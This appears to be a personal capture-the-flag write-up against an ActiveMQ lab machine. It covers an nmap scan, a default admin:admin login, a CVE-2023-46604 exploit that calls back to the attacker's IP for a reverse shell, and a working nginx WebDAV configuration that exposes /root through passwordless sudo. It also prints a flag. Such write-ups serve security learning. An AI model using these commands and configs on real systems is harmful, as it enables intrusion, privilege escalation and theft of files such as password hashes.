## Reconnaissance

- Conducted an NMAP Scan with
	- `udo nmap -sV -sC -oA initial --disable-arp-ping -Pn -p- --min-rate 5000 10.10.11.243`
- Multiple services were found
	- 22 - SSH - OpenSSH 8.9 p 1 Ubuntu 3 ubuntu 0.4 (Ubuntu Linux; protocol 2.0)
	- 80 - HTTP - nginx 1.18.0 (Ubuntu)
	- 1337 - HTTP - nginx 1.18.0 (Ubuntu)
	- 1342 - HTTP - nginx 1.18.0 (Ubuntu)
	- 1338 - HTTP - nginx 1.18.0 (Ubuntu)
	- 1342 - HTTP - nginx 1.18.0 (Ubuntu)
	- 1883 - MQTT - mqtt-subscribe
	- 4444 - HTTP - nginx 1.18.0 (Ubuntu)
	- 5672 - amqp
	- 8161 - http - Jetty 9.4.39. V 20210325
	- 13337 - HTTP - nginx 1.18.0 (Ubuntu)
	- 13338 - HTTP - nginx 1.18.0 (Ubuntu)
	- 37913 - tcpwrapped
	- 61613 - stomp - Apache ActiveMQ
	- 61614 - HTTP - Jetty 9.4.39. V 20210325
	- 61616 - apachemq - ActiveMQ OpenWire transport
- Browsing to the default webpage you are presented with a login prompt
- I tried a couple of different common username/password combos and admin: admin  worked
- That gets you into the ActiveMQ Manage Page
- Clicking on Manage AcitveMQ gives you a bit more information
	- Broker
		- Name: localhost
		- Version: 5.15.15
		- ID: ID: broker-34937-1701941373037-0:1
- For good measure I ran gobuster against the server to enumerate any VHOSTS and any Directories and nothing was found.

## Weaponisation

- Googling for CVE's against ActiveMQ turned up a number. 
- One that matched the version and provided the possibility of an RCE to get a reverse shell was CVE-2023-46604
- I found a Github repository that had a complete exploit that would send a meterpreter payload however, the page seems to be down. 
- So I found another repository that established a psuedo shell with limited functionality. 
	- https://github.com/duck-sec/CVE-2023-46604-ActiveMQ-RCE-pseudoshell
- I cloned this repo and ran the following command:
	- `python3 exploit.py -i 10.10.11.243 -si 10.10.14.179 -sp 4444`
- This popped a shell with user level access (activemq)
- This shell was very limited and difficult to work with so I did some more googling and found this one that delivers a payload in the form of an XML file. 
	- https://github.com/evkl1d/CVE-2023-46604
- Modifying the poc. Xml file and starting a listener I was able to pop a better shell
- I then upgraded the shell using
	- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
## Delivery

- User flag was recovered: `e2b04be994fa8f23c6f99a331bea97da`
- From here I did some more Enumeration and discovered that the current user **activemq** can run /usr/sbin/nginx with sudo without a password. 
	- Nginx Version: 1.18.1
- I'm not familiar with nginx so I looked around for possible ways to run a shell script from nginx with not much luck. 

## Exploitation / Installation

- Looking at the problem I think it would require me to run an Nginx server with a custom configuration to do something. 
- I switched the CTF to guided mode to see if it would steer me in the right direction and it pointed me towards using Webdav methods.
- After a little stuffing around with Nginx configuration files I ended up with the following:

```
daemon            off;
worker_processes  2;
user              root;

events {
    use           epoll;
    worker_connections  128;
}


http {
    server_tokens off;
    charset       utf-8;

    server {
       listen 8080 default_server;
       root /root/;
       index index.html index.htm index.nginx-debian.html;
       server_name _;

       location / {
           dav_methods PUT DELETE MKCOL COPY MOVE;
           dav_access user:rw group:rw all:rw;

           client_max_body_size 0;
           create_full_put_path on;
           client_body_temp_path /tmp/;
       }
    }
}
```
- I then ran nginx with 
	- `sudo /usr/sbin/nginx -c /tmp/nginx.conf` and that started a NGINX server on port 8080.

## Actions on Objective

- I then used wget to grab the root. Txt file in /root. 
- I could of used this to grab the shadow file or anything else that I want from the server. 
- Root Flag Recovered
